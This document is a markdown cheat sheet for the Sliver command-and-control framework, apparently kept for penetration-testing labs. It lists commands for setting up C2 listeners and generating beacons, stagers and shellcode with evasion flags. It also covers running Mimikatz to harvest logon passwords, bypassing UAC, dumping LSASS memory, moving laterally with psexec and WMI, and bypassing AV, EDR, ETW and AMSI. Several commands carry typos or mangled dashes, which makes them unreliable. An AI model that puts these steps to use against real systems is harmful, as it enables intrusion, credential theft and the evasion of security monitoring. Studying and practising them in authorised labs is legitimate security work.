# Sliver C2 Framework 
#### Sliver Setup 
```bash
# install 
sudo apt-get install sliver

# setup sliver server 
sliver-server
new-operator -n <name> -l <lhost>
multiplayer

# setup sliver client
sliver-client import <file.cgf>
sliver-client
```

#### armory 
```bash
armory install all
```

#### listeners 
```bash
# mtls - mutual transport layer security (encrypted TLS connection between both parties)
mtls -L <IP> -l 443 

# https/https
http -L <IP> -l <port> 
https -L <IP> -l <port> 
```

#### profiles 
```bash
# generate profiles
profiles new beacon --mtls 10.10.15.221:443 --format shellcode win-shellcode 
profiles new beacon --mtls 10.10.10.10:443 --arch amd64 --os windows -f shellcode --evasion --timeout 300 --seconds 5 --jitter 1 funny_bytes

# list profiles
profiles
```

#### shellcode
```bash
# sliver shellcode
generate -f shellcode —mtls 10.10.51.221:443 -s /home/kali/payload.bin -G —skip-symbols

# generate shellcode from profile
profiles generate --save . <profile name> 
```

#### implants/beacons 
```bash
generate beacon --http http://10.10.15.221 --os windows --save .
generate beacon --https https://10.10.15.221 --os windows --save .
generate —mtls <IP>:443 —os linux —arch amd64 —save /root/beacons
generate —mtls <IP>:443 —os windows —arch amd64 —save /root/beacons/

# usage
beacons
beacons rm
```

#### stagers 
```bash
# the setup 
Profile beacon —mtls:443 
Mtls on 443 
Stage-listener on TCP:8080
Stager (payload) on 8080 

# profile
profiles new beacon --mtls 10.10.15.221:443 --format shellcode Windows-x64

# mtls c2 listener
mtls -L 10.10.15.221 -l 443

# stage-listener
stage-listener --url tcp://192.168.56.1:8080 -p Windows-x64

# stager shellcode
generate stager --lhost 10.10.15.221 --lport 8080 --save /tmp
```

#### session interaction 
```bash
# spawn interactive session 
use <id> 
interactive

# list sessions
sessions

# kill all sessions
sessions -K

# kill single session
sessions -k <id> 
```

#### session commands
```bash
cat
ls
mkdir
rm
mv
ps
pwd
getpid
getuid
info
ifconfig
netstat	
ping
kill
whoami 
getprivs 
hostname 
cd c:\\users\\public\\downloads
shell
pivots
port fwd
socks5
procdump 
ssh
upload/download <file> 

# preferred method (OPSEC)
execute -o <os cmd> 
execute -o whommi
execute-assembly <path-to-local script> <command>
shell (drop into cli) -> exit (exit shell mode) 
upload /home/kali/HTB/ProLabs/Cyb/Invoke-Mimikatz.ps1
execute -o powershell import-module .\Invoke-Mimikatz.ps1
execute -o powershell Invoke-Mimikatz -Command '"sekurlsa::logonpasswords"'
runas -p ifconfig.exe -a “/all” -u labuser\\localAdmin - # run new process in context of another user (windows) 
```

#### domain enum 
```bash
# PowerView/SharpView
sharpview

# Seatbelt
seatbelt -p C:\\Windows\\SYstem32\\werfault.exe — “-group=user”

# bloodhound
sharp-hound-4 — -c all
```

#### privilege escalation 
```bash
# Enumeration
execute -o whomi /all
execute -o net local group “administrators”
execute -o net group “domain admins” /domain
execute -o reg query HKLM\\SYSTEM\\CurrentControlSet\\Control\\SecurityProviders\\WDigest /v UseLogonCredential
sharpup -t 120 -p C:\\Windows\\System32\\werfault.exe audit 

# UAC bypass
execute -o powershell -ExecutionPolicy Bypass -File “C:\users\test\documents\file\uac.ps1”
getsystem
```

#### dumping creds - LSASS
```bash
# nanodump 
ps (get the LSASS pid) 
nanodump <pid> dump.dmp 1 PMDM 

# procdump
procdump -p <lsass pid> —save lsass.dmp
```

#### user impersonation 
```bash
impersonate
make-token 
```

#### session passing
```bash
# SMB 
profiles new —format service —named-pipe <local ip>/pipe/<named pipe> svc-smb-beacon
pivots named-pipe —bind <named_pipe>

# psexec
psexec --profile cybernetics --serivce-name pentest --service-description pentest 10.9.20.10
psexec -d Description -s PAEXEC -p svc-smb-beacon <remote_computer>

# WMI
sharp-wmi ‘action=exec computername=<remtoe computer> command=“C:\windows\temp\xx.exe” results=true’
```

#### bypassing AV/EDR 
```bash
# migrate process
migrate <pid>

# EDR bypass
unhook-bof

# ETW bypass
inject-eww-bypass <PID>

# AMSI bypass
inject-ansi-bypass <pid> 

# armory extensions 
armory install windows-bypass
armory install windows-pivot
armory install situational-awareness
armory install .net-execute
armory install .net-pivot
armory install .net-recon
```



